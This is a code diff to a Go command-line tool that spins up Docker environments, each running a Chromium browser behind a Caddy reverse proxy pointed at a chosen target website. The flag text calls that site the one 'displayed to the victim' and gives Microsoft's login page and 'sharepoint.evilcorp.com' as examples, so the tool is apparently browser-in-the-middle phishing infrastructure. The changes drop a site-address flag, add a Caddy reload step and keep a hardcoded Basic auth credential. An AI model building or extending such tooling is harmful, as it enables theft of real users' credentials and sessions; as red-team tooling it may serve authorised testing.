@@ -26,7 +26,6 @@ var createCmd = &cobra.Command{
         prefix, _ := cmd.Flags().GetString("prefix")
         names, _ := cmd.Flags().GetStringSlice("names")
         targetURL, _ := cmd.Flags().GetString("targetURL")
-        siteAddress, _ := cmd.Flags().GetString("siteAddress")
 
         // Check if both the names and prefix arguments are being used, if so, throw an error.
         if len(names) > 0 && len(prefix) > 0 {
@@ -43,7 +42,7 @@ var createCmd = &cobra.Command{
             }
             // If count matches up execute the createEnvironment() with name values 
             for _, name := range names {
-                createEnvironment(name, targetURL, siteAddress)
+                createEnvironment(name, targetURL)
             }
         // Check if prefix is being used and has a value    
         } else if len(prefix) > 0 {
@@ -51,7 +50,7 @@ var createCmd = &cobra.Command{
                 // Append numbers to the end of the prefix (Ex. --prefix test = test1, test2, etc.)
                 envName := fmt.Sprintf("%s%d", prefix, i)
                 // Execute createEnvironment() with prefix values 
-                createEnvironment(envName, targetURL, siteAddress)
+                createEnvironment(envName, targetURL)
             }
         // Check if no path naming scheme has been provided, if so throw an error.
         } else {
@@ -71,11 +70,9 @@ func init() {
     createCmd.Flags().StringSliceP("names", "n", []string{}, "Comma-separated list of environment names")
     createCmd.Flags().StringP("targetURL", "u", "", "URL of the target website to be displayed to the victim - Ex. 'https://login.microsoftonline.com'")
     createCmd.MarkFlagRequired("targetURL")
-    createCmd.Flags().StringP("siteAddress", "a", "", "The domain, used for routing purposes in the Caddy config file. Ex. 'sharepoint.evilcorp.com'")
-    createCmd.MarkFlagRequired("siteAddress")
 }
 
-func createEnvironment(name, targetURL, siteAddress string) {
+func createEnvironment(name, targetURL string) {
     fmt.Println("Creating environment:", name)
 
     // Generating docker-compose.yml, from template file
@@ -85,7 +82,7 @@ func createEnvironment(name, targetURL, siteAddress string) {
     }
 
     // Generating .env files for each environment
-    err := generateEnvFile(name, targetURL, siteAddress)
+    err := generateEnvFile(name, targetURL)
     if err != nil {
         log.Printf("Failed to create .env file. Error: %s\n", err)
         return
@@ -129,6 +126,13 @@ func createEnvironment(name, targetURL, siteAddress string) {
         return
     }
     log.Printf("Environment %s: Services started successfully!", name)
+
+    // Reload Caddy instance
+    errReload := reloadCaddy()
+    if errReload != nil {
+        log.Printf("Failed to reload Caddy. Error: %s\n", errReload)
+        return
+    }
 }
 
 // Generate docker-compose.yml from template file
@@ -173,7 +177,7 @@ func updateCaddy(envName string) error {
 
     // Create handle directorive for new environment
     handleDirective := fmt.Sprintf(`
-    redir /%s / 
+redir /%s / 
     reverse_proxy * {
             to https://chromium-%s:6901
         header_up Authorization "Basic a2FzbV91c2VyOmFzZGZmZHNh"
@@ -197,16 +201,28 @@ func updateCaddy(envName string) error {
     return nil
 }
 
+// Function to reload the caddy instance with the newly modified Caddyfile routes(s)
+func reloadCaddy() error {
+    cmd := exec.Command("docker-compose", "-f", "./docker/docker-compose-caddy.yml", "exec", "-T", "caddy", "caddy", "reload", "--config", "/etc/caddy/Caddyfile")
+    output, err := cmd.CombinedOutput()
+    if err != nil {
+        log.Println("Failed to reload Caddy:", string(output))
+        return err
+    }
+    log.Println("Caddy reloaded successfully!")
+    return nil
+}
+
+
 // Generating .env files for each environment
-func generateEnvFile(envName, targetURL, siteAddress string) error {
+func generateEnvFile(envName, targetURL string) error {
     // Specifying the contents of the .env file
     content := fmt.Sprintf(
     `TARGET_URL=%s
-    SITE_ADDRESS=%s
     LANGUAGE=en
     LANG=en_US.UTF-8
     LC_ALL=en_US.UTF-8`,
-    targetURL, siteAddress)
+    targetURL)
     
     // Assign configDir to the current environment directory
     configDir := fmt.Sprintf("./docker/configs/%s", envName)
